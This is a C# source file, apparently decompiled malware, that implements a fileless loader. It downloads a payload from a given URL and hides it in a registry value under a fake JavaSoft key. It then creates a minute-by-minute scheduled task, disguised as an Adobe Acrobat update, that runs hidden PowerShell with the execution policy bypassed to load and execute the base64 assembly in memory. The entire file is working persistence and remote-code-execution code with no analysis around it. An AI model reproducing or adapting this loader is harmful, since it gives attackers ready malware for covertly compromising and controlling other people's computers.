using System;
using System.Diagnostics;
using System.Net;
using Microsoft.Win32;

public static class GClass37
{
	public static void smethod_0(string link)
	{
		smethod_2(smethod_1(link));
		smethod_3();
	}

	private static string smethod_1(string url)
	{
		using WebClient webClient = new WebClient();
		return webClient.DownloadString(url);
	}

	private static void smethod_2(string daolyap)
	{
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\JavaSoft", writable: true);
		if (registryKey == null)
		{
			registryKey = Registry.CurrentUser.CreateSubKey("Software\\JavaSoft");
			registryKey.SetValue("daolyap", daolyap);
		}
		else if (registryKey.GetValue("daolyap") == null || !registryKey.GetValue("daolyap")!.ToString()!.Equals(daolyap, StringComparison.CurrentCultureIgnoreCase))
		{
			registryKey.SetValue("daolyap", daolyap);
		}
	}

	private static void smethod_3()
	{
		string text = "powershell -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -NoExit -Command [System.Reflection.Assembly]::Load([System.Convert]::FromBase64String((Get-ItemProperty HKCU:\\Software\\JavaSoft\\).daolyap)).EntryPoint.Invoke($Null,$Null)";
		Process.Start(new ProcessStartInfo
		{
			FileName = "schtasks",
			Arguments = "/create /sc minute /mo 1 /tn Adobe-Acrobat-Update-Task /tr \"" + text + "\"",
			CreateNoWindow = true,
			ErrorDialog = false,
			WindowStyle = ProcessWindowStyle.Hidden
		});
	}
}
